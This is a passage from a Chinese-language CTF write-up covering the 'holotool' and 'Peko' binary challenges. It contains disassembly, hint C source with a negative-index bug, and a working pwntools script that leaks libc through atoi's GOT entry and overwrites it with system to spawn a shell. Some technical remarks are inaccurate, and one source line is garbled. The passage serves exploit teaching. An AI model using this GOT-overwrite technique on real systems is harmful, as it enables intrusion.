  40166c:	48 8d 3d 91 0c 00 00 	lea    rdi,[rip+0xc91]        # 402304 <_IO_stdin_used+0x304>
  401673:	e8 28 fa ff ff       	call   4010a0 <puts@plt>
  401678:	48 8d 3d 92 0c 00 00 	lea    rdi,[rip+0xc92]        # 402311 <_IO_stdin_used+0x311>
  40167f:	e8 1c fa ff ff       	call   4010a0 <puts@plt>
  401684:	ba 02 00 00 00       	mov    edx,0x2
  401689:	48 8d 35 8b 0c 00 00 	lea    rsi,[rip+0xc8b]        # 40231b <_IO_stdin_used+0x31b>
  401690:	bf 01 00 00 00       	mov    edi,0x1
  401695:	e8 16 fa ff ff       	call   4010b0 <write@plt>
  40169a:	b8 00 00 00 00       	mov    eax,0x0
  40169f:	e8 2a fe ff ff       	call   4014ce <read_int>
  4016a4:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  4016a7:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  4016ab:	7e 06                	jle    4016b3 <edit_info+0xbf>
  4016ad:	83 7d f8 03          	cmp    DWORD PTR [rbp-0x8],0x3
  4016b1:	7e 11                	jle    4016c4 <edit_info+0xd0>
  4016b3:	48 8d 3d 64 0c 00 00 	lea    rdi,[rip+0xc64]        # 40231e <_IO_stdin_used+0x31e>
  4016ba:	e8 e1 f9 ff ff       	call   4010a0 <puts@plt>
  4016bf:	e9 31 01 00 00       	jmp    4017f5 <edit_info+0x201>
  4016c4:	ba 09 00 00 00       	mov    edx,0x9
  4016c9:	48 8d 35 5d 0c 00 00 	lea    rsi,[rip+0xc5d]        # 40232d <_IO_stdin_used+0x32d>
  4016d0:	bf 01 00 00 00       	mov    edi,0x1
  4016d5:	e8 d6 f9 ff ff       	call   4010b0 <write@plt>
  4016da:	48 8d 45 d0          	lea    rax,[rbp-0x30]
  4016de:	ba 20 00 00 00       	mov    edx,0x20
  4016e3:	48 89 c6             	mov    rsi,rax
  4016e6:	bf 00 00 00 00       	mov    edi,0x0
  4016eb:	e8 e0 f9 ff ff       	call   4010d0 <read@plt>
  4016f0:	83 7d f8 03          	cmp    DWORD PTR [rbp-0x8],0x3
  4016f4:	0f 84 a0 00 00 00    	je     40179a <edit_info+0x1a6>
  4016fa:	83 7d f8 03          	cmp    DWORD PTR [rbp-0x8],0x3
  4016fe:	0f 8f d9 00 00 00    	jg     4017dd <edit_info+0x1e9>
  401704:	83 7d f8 01          	cmp    DWORD PTR [rbp-0x8],0x1
  401708:	74 0b                	je     401715 <edit_info+0x121>
  40170a:	83 7d f8 02          	cmp    DWORD PTR [rbp-0x8],0x2
  40170e:	74 47                	je     401757 <edit_info+0x163>
  401710:	e9 c8 00 00 00       	jmp    4017dd <edit_info+0x1e9>
  401715:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401718:	48 63 d0             	movsxd rdx,eax
  40171b:	48 89 d0             	mov    rax,rdx
  40171e:	48 01 c0             	add    rax,rax
  401721:	48 01 d0             	add    rax,rdx
  401724:	48 c1 e0 05          	shl    rax,0x5
  401728:	48 8d 15 71 29 00 00 	lea    rdx,[rip+0x2971]        # 4040a0 <vTubers>
  40172f:	48 8d 0c 10          	lea    rcx,[rax+rdx*1]
  401733:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401737:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40173b:	48 89 01             	mov    QWORD PTR [rcx],rax
  40173e:	48 89 51 08          	mov    QWORD PTR [rcx+0x8],rdx
  401742:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  401746:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  40174a:	48 89 41 10          	mov    QWORD PTR [rcx+0x10],rax
  40174e:	48 89 51 18          	mov    QWORD PTR [rcx+0x18],rdx
  401752:	e9 92 00 00 00       	jmp    4017e9 <edit_info+0x1f5>
  401757:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40175a:	48 63 d0             	movsxd rdx,eax
  40175d:	48 89 d0             	mov    rax,rdx
  401760:	48 01 c0             	add    rax,rax
  401763:	48 01 d0             	add    rax,rdx
  401766:	48 c1 e0 05          	shl    rax,0x5
  40176a:	48 8d 50 20          	lea    rdx,[rax+0x20]
  40176e:	48 8d 05 2b 29 00 00 	lea    rax,[rip+0x292b]        # 4040a0 <vTubers>
  401775:	48 8d 0c 02          	lea    rcx,[rdx+rax*1]
  401779:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40177d:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  401781:	48 89 01             	mov    QWORD PTR [rcx],rax
  401784:	48 89 51 08          	mov    QWORD PTR [rcx+0x8],rdx
  401788:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40178c:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  401790:	48 89 41 10          	mov    QWORD PTR [rcx+0x10],rax
  401794:	48 89 51 18          	mov    QWORD PTR [rcx+0x18],rdx
  401798:	eb 4f                	jmp    4017e9 <edit_info+0x1f5>
  40179a:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40179d:	48 63 d0             	movsxd rdx,eax
  4017a0:	48 89 d0             	mov    rax,rdx
  4017a3:	48 01 c0             	add    rax,rax
  4017a6:	48 01 d0             	add    rax,rdx
  4017a9:	48 c1 e0 05          	shl    rax,0x5
  4017ad:	48 8d 50 40          	lea    rdx,[rax+0x40]
  4017b1:	48 8d 05 e8 28 00 00 	lea    rax,[rip+0x28e8]        # 4040a0 <vTubers>
  4017b8:	48 8d 0c 02          	lea    rcx,[rdx+rax*1]
  4017bc:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4017c0:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4017c4:	48 89 01             	mov    QWORD PTR [rcx],rax
  4017c7:	48 89 51 08          	mov    QWORD PTR [rcx+0x8],rdx
  4017cb:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4017cf:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  4017d3:	48 89 41 10          	mov    QWORD PTR [rcx+0x10],rax
  4017d7:	48 89 51 18          	mov    QWORD PTR [rcx+0x18],rdx
  4017db:	eb 0c                	jmp    4017e9 <edit_info+0x1f5>
  4017dd:	48 8d 3d 53 0b 00 00 	lea    rdi,[rip+0xb53]        # 402337 <_IO_stdin_used+0x337>
  4017e4:	e8 b7 f8 ff ff       	call   4010a0 <puts@plt>
  4017e9:	48 8d 3d 58 0b 00 00 	lea    rdi,[rip+0xb58]        # 402348 <_IO_stdin_used+0x348>
  4017f0:	e8 ab f8 ff ff       	call   4010a0 <puts@plt>
  4017f5:	c9                   	leave  
  4017f6:	c3                   	ret    

00000000004017f7 <main>:
  4017f7:	f3 0f 1e fa          	endbr64 
  4017fb:	55                   	push   rbp
  4017fc:	48 89 e5             	mov    rbp,rsp
  4017ff:	48 83 ec 10          	sub    rsp,0x10
  401803:	b8 00 00 00 00       	mov    eax,0x0
  401808:	e8 e9 f9 ff ff       	call   4011f6 <init>
  40180d:	b8 00 00 00 00       	mov    eax,0x0
  401812:	e8 44 fa ff ff       	call   40125b <banner>
  401817:	b8 00 00 00 00       	mov    eax,0x0
  40181c:	e8 99 fa ff ff       	call   4012ba <init_info>
  401821:	48 8d 3d 2d 0b 00 00 	lea    rdi,[rip+0xb2d]        # 402355 <_IO_stdin_used+0x355>
  401828:	e8 73 f8 ff ff       	call   4010a0 <puts@plt>
  40182d:	48 8d 3d 2e 0b 00 00 	lea    rdi,[rip+0xb2e]        # 402362 <_IO_stdin_used+0x362>
  401834:	e8 67 f8 ff ff       	call   4010a0 <puts@plt>
  401839:	48 8d 3d 2f 0b 00 00 	lea    rdi,[rip+0xb2f]        # 40236f <_IO_stdin_used+0x36f>
  401840:	e8 5b f8 ff ff       	call   4010a0 <puts@plt>
  401845:	ba 02 00 00 00       	mov    edx,0x2
  40184a:	48 8d 35 ca 0a 00 00 	lea    rsi,[rip+0xaca]        # 40231b <_IO_stdin_used+0x31b>
  401851:	bf 01 00 00 00       	mov    edi,0x1
  401856:	e8 55 f8 ff ff       	call   4010b0 <write@plt>
  40185b:	b8 00 00 00 00       	mov    eax,0x0
  401860:	e8 69 fc ff ff       	call   4014ce <read_int>
  401865:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
  401868:	83 7d fc 03          	cmp    DWORD PTR [rbp-0x4],0x3
  40186c:	74 2c                	je     40189a <main+0xa3>
  40186e:	83 7d fc 03          	cmp    DWORD PTR [rbp-0x4],0x3
  401872:	7f 3c                	jg     4018b0 <main+0xb9>
  401874:	83 7d fc 01          	cmp    DWORD PTR [rbp-0x4],0x1
  401878:	74 08                	je     401882 <main+0x8b>
  40187a:	83 7d fc 02          	cmp    DWORD PTR [rbp-0x4],0x2
  40187e:	74 0e                	je     40188e <main+0x97>
  401880:	eb 2e                	jmp    4018b0 <main+0xb9>
  401882:	b8 00 00 00 00       	mov    eax,0x0
  401887:	e8 72 fc ff ff       	call   4014fe <show_info>
  40188c:	eb 2e                	jmp    4018bc <main+0xc5>
  40188e:	b8 00 00 00 00       	mov    eax,0x0
  401893:	e8 5c fd ff ff       	call   4015f4 <edit_info>
  401898:	eb 22                	jmp    4018bc <main+0xc5>
  40189a:	48 8d 3d d6 0a 00 00 	lea    rdi,[rip+0xad6]        # 402377 <_IO_stdin_used+0x377>
  4018a1:	e8 fa f7 ff ff       	call   4010a0 <puts@plt>
  4018a6:	bf 00 00 00 00       	mov    edi,0x0
  4018ab:	e8 50 f8 ff ff       	call   401100 <exit@plt>
  4018b0:	48 8d 3d c5 0a 00 00 	lea    rdi,[rip+0xac5]        # 40237c <_IO_stdin_used+0x37c>
  4018b7:	e8 e4 f7 ff ff       	call   4010a0 <puts@plt>
  4018bc:	48 8d 3d 45 07 00 00 	lea    rdi,[rip+0x745]        # 402008 <_IO_stdin_used+0x8>
  4018c3:	e8 d8 f7 ff ff       	call   4010a0 <puts@plt>
  4018c8:	e9 54 ff ff ff       	jmp    401821 <main+0x2a>
  4018cd:	0f 1f 00             	nop    DWORD PTR [rax]

00000000004018d0 <__libc_csu_init>:
  4018d0:	f3 0f 1e fa          	endbr64 
  4018d4:	41 57                	push   r15
  4018d6:	4c 8d 3d 33 25 00 00 	lea    r15,[rip+0x2533]        # 403e10 <__frame_dummy_init_array_entry>
  4018dd:	41 56                	push   r14
  4018df:	49 89 d6             	mov    r14,rdx
  4018e2:	41 55                	push   r13
  4018e4:	49 89 f5             	mov    r13,rsi
  4018e7:	41 54                	push   r12
  4018e9:	41 89 fc             	mov    r12d,edi
  4018ec:	55                   	push   rbp
  4018ed:	48 8d 2d 24 25 00 00 	lea    rbp,[rip+0x2524]        # 403e18 <__do_global_dtors_aux_fini_array_entry>
  4018f4:	53                   	push   rbx
  4018f5:	4c 29 fd             	sub    rbp,r15
  4018f8:	48 83 ec 08          	sub    rsp,0x8
  4018fc:	e8 ff f6 ff ff       	call   401000 <_init>
  401901:	48 c1 fd 03          	sar    rbp,0x3
  401905:	74 1f                	je     401926 <__libc_csu_init+0x56>
  401907:	31 db                	xor    ebx,ebx
  401909:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
  401910:	4c 89 f2             	mov    rdx,r14
  401913:	4c 89 ee             	mov    rsi,r13
  401916:	44 89 e7             	mov    edi,r12d
  401919:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  40191d:	48 83 c3 01          	add    rbx,0x1
  401921:	48 39 dd             	cmp    rbp,rbx
  401924:	75 ea                	jne    401910 <__libc_csu_init+0x40>
  401926:	48 83 c4 08          	add    rsp,0x8
  40192a:	5b                   	pop    rbx
  40192b:	5d                   	pop    rbp
  40192c:	41 5c                	pop    r12
  40192e:	41 5d                	pop    r13
  401930:	41 5e                	pop    r14
  401932:	41 5f                	pop    r15
  401934:	c3                   	ret    
  401935:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  40193c:	00 00 00 00 

0000000000401940 <__libc_csu_fini>:
  401940:	f3 0f 1e fa          	endbr64 
  401944:	c3                   	ret    

.fini 區段的反組譯：

0000000000401948 <_fini>:
  401948:	f3 0f 1e fa          	endbr64 
  40194c:	48 83 ec 08          	sub    rsp,0x8
  401950:	48 83 c4 08          	add    rsp,0x8
  401954:	c3                   	ret    

```
</details>
<details>
<summary>hint cdoe</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// struct
struct info
{
    char name[0x20];
    char channel[0x20];
    char twitter[0x20];
};

// global variable
struct info vTubers[5];

// function
void init()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void banner()
{
    puts("");
    puts("          ▄ .▄      ▄▄▌        ▄▄▄▄▄            ▄▄▌  ");
    puts("         ██▪▐█▪     ██•  ▪     •██  ▪     ▪     ██•  ");
    puts("         ██▀▐█ ▄█▀▄ ██▪   ▄█▀▄  ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ");
    puts("         ██▌▐▀▐█▌.▐▌▐█▌▐▌▐█▌.▐▌ ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌");
    puts("         ▀▀▀ · ▀█▄▀▪.▀▀▀  ▀█▄▀▪ ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀ ");
    puts("");
}

void init_info()
{
    strcpy(vTubers[0].name, "Gawr Gura");
    strcpy(vTubers[0].channel, "https://ppt.cc/fHT61x");
    strcpy(vTubers[0].twitter, "https://ppt.cc/fHP2Ax");

    strcpy(vTubers[1].name, "Watson Amelia");
    strcpy(vTubers[1].channel, "https://ppt.cc/fIaIsx");
    strcpy(vTubers[1].twitter, "https://ppt.cc/f675Ox");

    strcpy(vTubers[2].name, "Uruha Rushia");
    strcpy(vTubers[2].channel, "https://ppt.cc/fYCxrx");
    strcpy(vTubers[2].twitter, "https://ppt.cc/f4dK6x");

    strcpy(vTubers[3].name, "Usada Pekora");
    strcpy(vTubers[3].channel, "https://ppt.cc/fHdPDx");
    strcpy(vTubers[3].twitter, "https://ppt.cc/fqbVSx");

    strcpy(vTubers[4].name, "Shirakami Fubuki");
    strcpy(vTubers[4].channel, "https://ppt.cc/fG5UCx");
    strcpy(vTubers[4].twitter, "https://ppt.cc/fmEPUx");
}

int read_int()
{
    char buf[0x10];
    read(0, buf, 0x10);
    return atoi(buf);//!!!!
}

void show_info()
{
    int idx = 0;
    puts("Enter which info to read (index should between 0-4)");
    write(1, "idx> ", 5);
    idx = read_int();

    if (idx >= 5)
    {
        puts("Invalid index!!");
        return;
    }

    printf("name: %s\n", vTubers[idx].name);
    printf("YT channel: %s\n", vTubers[idx].channel);
    printf("Twitter: %s\n", vTubers[idx].twitter);
}

void edit_info()
{
    int idx = 0;
    int choice = 0;
    char buf[0x2:0];
    puts("Enter which info to edit (index should between 0-4)");
    write(1, "idx> ", 5);
    idx = read_int();

    if (idx >= 5)
    {
        puts("Invalid index!!");
        return;
    }

    puts("Enter which info to edit");
    puts("1.name");
    puts("2.YT cahnnel");
    puts("3.Twitter");
    write(1, "> ", 2);
    choice = read_int();

    if (choice <= 0 || choice > 3)
    {
        puts("Wrong argument");
        return;
    }
    write(1, "Content: ", 9);
    read(0, buf, 0x20);

    switch (choice)
    {
    case 1:
        memcpy(vTubers[idx].name, buf, 0x20);
        break;
    case 2:
        memcpy(vTubers[idx].channel, buf, 0x20);
        break;
    case 3:
        memcpy(vTubers[idx].twitter, buf, 0x20);
        break;
    default:
        puts("Invalid argument");
    }

    puts("Edit success");
}

int main()
{
    init();//
    banner();//
    init_info();//

    int choice;
    while (1)
    {
        puts("1. show info");
        puts("2. edit info");
        puts("3. exit");
        write(1, "> ", 2);
        choice = read_int();
        switch (choice)
        {
        case 1:
            show_info();
            break;
        case 2:
            edit_info();
            break;
        case 3:
            puts("bye~");
            exit(0);
        default:
            puts("Invalie choice!!");
        }
        puts("");
    }

    return 0;
}

```
</details>

**key concept :** <font color = #FF0080 > GOT table</font>


**突破點 :**


1. 因為這題無法overflow，而且有開 NX ，所以寫進stack中的shellcode也無法執行。
2. 我們發現，在選擇要 Print 出 VTuber 的選項時，沒有設置下限，所以可藉由打「-1」將原本要讀取 VT[1].name的位置反向讀取到atoi 在 GOT表的值，因此可以Print出atoi 在libc.sym中的位置(取得libc的位置)。
3. 藉由算offset以及使用「libc.sym」找到system call 的位置。
4. 發現在選項(2)edit中選擇編輯誰時，因為輸入同上沒設置下限，從而造成接下來原本要輸入進VT[1].name 的system call在libc的位置被存入atoi 在 got table 中的位置。
5. 因為got table的 system call會自動將 rax設成 0x3b，所以我們接下來的目標就是改變 rdi,rsi的內容。
6. 我們發現在 read_int() 中 read()會將輸入存進rdi,rsi，並且接下來就呼叫atoi()，非常符合我們的需求，所以我直接輸入 /bin/sh 開shell。
7. Payload
```python 
from pwn import *
import struct
context.arch = "amd64"
p = process('share/holotool') # p = remote('140.115.59.7',10005)
libc = ELF('./holotool_distribute/share/libc.so.6')

pause()
p.send(b"1")		# input 1 (Print)
pause()
p.send(b"-1") 		# input -1 (Print bas Address)

atoi = u64(p.recvuntil('\nYT')[635:641].ljust(8, b'\x00'))
syscalls = atoi - libc.sym['atoi'] + libc.sym['system']

pause()
p.send(b"2")		# send 2 (edit)
pause()
p.send(b"-1")		# send -1 (direct to GOT)
pause()
p.send(b"1")		# send 1 (write name)
pause()
p.send(p64(syscalls))		# send syscalls address to got
pause()
p.send(b"/bin/sh")		# send /bin/sh (in rdi & rsi )
p.interactive()
```

## Peko
<details>
<summary>soure code</summary>

```x86asm

peko:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:	f3 0f 1e fa          	endbr64 
  401004:	48 83 ec 08          	sub    rsp,0x8
  401008:	48 8b 05 e9 4f 00 00 	mov    rax,QWORD PTR [rip+0x4fe9]        # 405ff8 <__gmon_start__>
  40100f:	48 85 c0             	test   rax,rax
  401012:	74 02                	je     401016 <_init+0x16>
  401014:	ff d0                	call   rax
  401016:	48 83 c4 08          	add    rsp,0x8
  40101a:	c3                   	ret    

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:	ff 35 e2 4f 00 00    	push   QWORD PTR [rip+0x4fe2]        # 406008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:	f2 ff 25 e3 4f 00 00 	bnd jmp QWORD PTR [rip+0x4fe3]        # 406010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:	0f 1f 00             	nop    DWORD PTR [rax]
  401030:	f3 0f 1e fa          	endbr64 
  401034:	68 00 00 00 00       	push   0x0
  401039:	f2 e9 e1 ff ff ff    	bnd jmp 401020 <.plt>
  40103f:	90                   	nop
  401040:	f3 0f 1e fa          	endbr64 
  401044:	68 01 00 00 00       	push   0x1
  401049:	f2 e9 d1 ff ff ff    	bnd jmp 401020 <.plt>
  40104f:	90                   	nop
  401050:	f3 0f 1e fa          	endbr64 
  401054:	68 02 00 00 00       	push   0x2
  401059:	f2 e9 c1 ff ff ff    	bnd jmp 401020 <.plt>
  40105f:	90                   	nop
  401060:	f3 0f 1e fa          	endbr64 
  401064:	68 03 00 00 00       	push   0x3
  401069:	f2 e9 b1 ff ff ff    	bnd jmp 401020 <.plt>
  40106f:	90                   	nop
  401070:	f3 0f 1e fa          	endbr64 
  401074:	68 04 00 00 00       	push   0x4
  401079:	f2 e9 a1 ff ff ff    	bnd jmp 401020 <.plt>
  40107f:	90                   	nop
  401080:	f3 0f 1e fa          	endbr64 
  401084:	68 05 00 00 00       	push   0x5
  401089:	f2 e9 91 ff ff ff    	bnd jmp 401020 <.plt>
  40108f:	90                   	nop

Disassembly of section .plt.sec:

0000000000401090 <strncmp@plt>:
  401090:	f3 0f 1e fa          	endbr64 
  401094:	f2 ff 25 7d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f7d]        # 406018 <strncmp@GLIBC_2.2.5>
  40109b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010a0 <puts@plt>:
  4010a0:	f3 0f 1e fa          	endbr64 
  4010a4:	f2 ff 25 75 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f75]        # 406020 <puts@GLIBC_2.2.5>
  4010ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010b0 <read@plt>:
  4010b0:	f3 0f 1e fa          	endbr64 
  4010b4:	f2 ff 25 6d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f6d]        # 406028 <read@GLIBC_2.2.5>
  4010bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010c0 <setvbuf@plt>:
  4010c0:	f3 0f 1e fa          	endbr64 
  4010c4:	f2 ff 25 65 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f65]        # 406030 <setvbuf@GLIBC_2.2.5>
  4010cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010d0 <__isoc99_scanf@plt>:
  4010d0:	f3 0f 1e fa          	endbr64 
  4010d4:	f2 ff 25 5d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f5d]        # 406038 <__isoc99_scanf@GLIBC_2.7>
  4010db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010e0 <exit@plt>:
  4010e0:	f3 0f 1e fa          	endbr64 
  4010e4:	f2 ff 25 55 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f55]        # 406040 <exit@GLIBC_2.2.5>
  4010eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

00000000004010f0 <_start>:
  4010f0:	f3 0f 1e fa          	endbr64 
  4010f4:	31 ed                	xor    ebp,ebp
  4010f6:	49 89 d1             	mov    r9,rdx
  4010f9:	5e                   	pop    rsi
  4010fa:	48 89 e2             	mov    rdx,rsp
  4010fd:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
  401101:	50                   	push   rax
  401102:	54                   	push   rsp
  401103:	49 c7 c0 b0 15 40 00 	mov    r8,0x4015b0
  40110a:	48 c7 c1 40 15 40 00 	mov    rcx,0x401540
  401111:	48 c7 c7 ea 13 40 00 	mov    rdi,0x4013ea
  401118:	ff 15 d2 4e 00 00    	call   QWORD PTR [rip+0x4ed2]        # 405ff0 <__libc_start_main@GLIBC_2.2.5>
  40111e:	f4                   	hlt    
  40111f:	90                   	nop

0000000000401120 <_dl_relocate_static_pie>:
  401120:	f3 0f 1e fa          	endbr64 
  401124:	c3                   	ret    
  401125:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40112c:	00 00 00 
  40112f:	90                   	nop

0000000000401130 <deregister_tm_clones>:
  401130:	b8 58 60 40 00       	mov    eax,0x406058
  401135:	48 3d 58 60 40 00    	cmp    rax,0x406058
  40113b:	74 13                	je     401150 <deregister_tm_clones+0x20>
  40113d:	b8 00 00 00 00       	mov    eax,0x0
  401142:	48 85 c0             	test   rax,rax
  401145:	74 09                	je     401150 <deregister_tm_clones+0x20>
  401147:	bf 58 60 40 00       	mov    edi,0x406058
  40114c:	ff e0                	jmp    rax
  40114e:	66 90                	xchg   ax,ax
  401150:	c3                   	ret    
  401151:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  401158:	00 00 00 00 
  40115c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000401160 <register_tm_clones>:
  401160:	be 58 60 40 00       	mov    esi,0x406058
  401165:	48 81 ee 58 60 40 00 	sub    rsi,0x406058
  40116c:	48 89 f0             	mov    rax,rsi
  40116f:	48 c1 ee 3f          	shr    rsi,0x3f
  401173:	48 c1 f8 03          	sar    rax,0x3
  401177:	48 01 c6             	add    rsi,rax
  40117a:	48 d1 fe             	sar    rsi,1
  40117d:	74 11                	je     401190 <register_tm_clones+0x30>
  40117f:	b8 00 00 00 00       	mov    eax,0x0
  401184:	48 85 c0             	test   rax,rax
  401187:	74 07                	je     401190 <register_tm_clones+0x30>
  401189:	bf 58 60 40 00       	mov    edi,0x406058
  40118e:	ff e0                	jmp    rax
  401190:	c3                   	ret    
  401191:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  401198:	00 00 00 00 
  40119c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000004011a0 <__do_global_dtors_aux>:
  4011a0:	f3 0f 1e fa          	endbr64 
  4011a4:	80 3d dd 4e 00 00 00 	cmp    BYTE PTR [rip+0x4edd],0x0        # 406088 <completed.8060>
  4011ab:	75 13                	jne    4011c0 <__do_global_dtors_aux+0x20>
  4011ad:	55                   	push   rbp
  4011ae:	48 89 e5             	mov    rbp,rsp
  4011b1:	e8 7a ff ff ff       	call   401130 <deregister_tm_clones>
  4011b6:	c6 05 cb 4e 00 00 01 	mov    BYTE PTR [rip+0x4ecb],0x1        # 406088 <completed.8060>
  4011bd:	5d                   	pop    rbp
  4011be:	c3                   	ret    
  4011bf:	90                   	nop
  4011c0:	c3                   	ret    
  4011c1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011c8:	00 00 00 00 
  4011cc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000004011d0 <frame_dummy>:
  4011d0:	f3 0f 1e fa          	endbr64 
  4011d4:	eb 8a                	jmp    401160 <register_tm_clones>

00000000004011d6 <init>:
  4011d6:	f3 0f 1e fa          	endbr64 
  4011da:	55                   	push   rbp
  4011db:	48 89 e5             	mov    rbp,rsp
  4011de:	48 8b 05 8b 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e8b]        # 406070 <stdin@@GLIBC_2.2.5>
  4011e5:	b9 00 00 00 00       	mov    ecx,0x0
  4011ea:	ba 02 00 00 00       	mov    edx,0x2
  4011ef:	be 00 00 00 00       	mov    esi,0x0
  4011f4:	48 89 c7             	mov    rdi,rax
  4011f7:	e8 c4 fe ff ff       	call   4010c0 <setvbuf@plt>
  4011fc:	48 8b 05 5d 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e5d]        # 406060 <stdout@@GLIBC_2.2.5>
  401203:	b9 00 00 00 00       	mov    ecx,0x0
  401208:	ba 02 00 00 00       	mov    edx,0x2
  40120d:	be 00 00 00 00       	mov    esi,0x0
  401212:	48 89 c7             	mov    rdi,rax
  401215:	e8 a6 fe ff ff       	call   4010c0 <setvbuf@plt>
  40121a:	48 8b 05 5f 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e5f]        # 406080 <stderr@@GLIBC_2.2.5>
  401221:	b9 00 00 00 00       	mov    ecx,0x0
  401226:	ba 02 00 00 00       	mov    edx,0x2
  40122b:	be 00 00 00 00       	mov    esi,0x0
  401230:	48 89 c7             	mov    rdi,rax
  401233:	e8 88 fe ff ff       	call   4010c0 <setvbuf@plt>
  401238:	90                   	nop
  401239:	5d                   	pop    rbp
  40123a:	c3                   	ret    

000000000040123b <banner>:
  40123b:	f3 0f 1e fa          	endbr64 
  40123f:	55                   	push   rbp
  401240:	48 89 e5             	mov    rbp,rsp
  401243:	48 8d 3d be 0d 00 00 	lea    rdi,[rip+0xdbe]        # 402008 <_IO_stdin_used+0x8>
  40124a:	e8 51 fe ff ff       	call   4010a0 <puts@plt>
  40124f:	48 8d 3d 8a 0e 00 00 	lea    rdi,[rip+0xe8a]        # 4020e0 <_IO_stdin_used+0xe0>
  401256:	e8 45 fe ff ff       	call   4010a0 <puts@plt>
  40125b:	48 8d 3d 56 0f 00 00 	lea    rdi,[rip+0xf56]        # 4021b8 <_IO_stdin_used+0x1b8>
  401262:	e8 39 fe ff ff       	call   4010a0 <puts@plt>
  401267:	48 8d 3d 22 10 00 00 	lea    rdi,[rip+0x1022]        # 402290 <_IO_stdin_used+0x290>
  40126e:	e8 2d fe ff ff       	call   4010a0 <puts@plt>
  401273:	48 8d 3d ee 10 00 00 	lea    rdi,[rip+0x10ee]        # 402368 <_IO_stdin_used+0x368>
  40127a:	e8 21 fe ff ff       	call   4010a0 <puts@plt>
  40127f:	48 8d 3d ba 11 00 00 	lea    rdi,[rip+0x11ba]        # 402440 <_IO_stdin_used+0x440>
  401286:	e8 15 fe ff ff       	call   4010a0 <puts@plt>
  40128b:	48 8d 3d 86 12 00 00 	lea    rdi,[rip+0x1286]        # 402518 <_IO_stdin_used+0x518>
  401292:	e8 09 fe ff ff       	call   4010a0 <puts@plt>
  401297:	48 8d 3d 52 13 00 00 	lea    rdi,[rip+0x1352]        # 4025f0 <_IO_stdin_used+0x5f0>
  40129e:	e8 fd fd ff ff       	call   4010a0 <puts@plt>
  4012a3:	48 8d 3d 1e 14 00 00 	lea    rdi,[rip+0x141e]        # 4026c8 <_IO_stdin_used+0x6c8>
  4012aa:	e8 f1 fd ff ff       	call   4010a0 <puts@plt>
  4012af:	48 8d 3d ea 14 00 00 	lea    rdi,[rip+0x14ea]        # 4027a0 <_IO_stdin_used+0x7a0>
  4012b6:	e8 e5 fd ff ff       	call   4010a0 <puts@plt>
  4012bb:	48 8d 3d b6 15 00 00 	lea    rdi,[rip+0x15b6]        # 402878 <_IO_stdin_used+0x878>
  4012c2:	e8 d9 fd ff ff       	call   4010a0 <puts@plt>
  4012c7:	48 8d 3d 82 16 00 00 	lea    rdi,[rip+0x1682]        # 402950 <_IO_stdin_used+0x950>
  4012ce:	e8 cd fd ff ff       	call   4010a0 <puts@plt>
  4012d3:	48 8d 3d 4e 17 00 00 	lea    rdi,[rip+0x174e]        # 402a28 <_IO_stdin_used+0xa28>
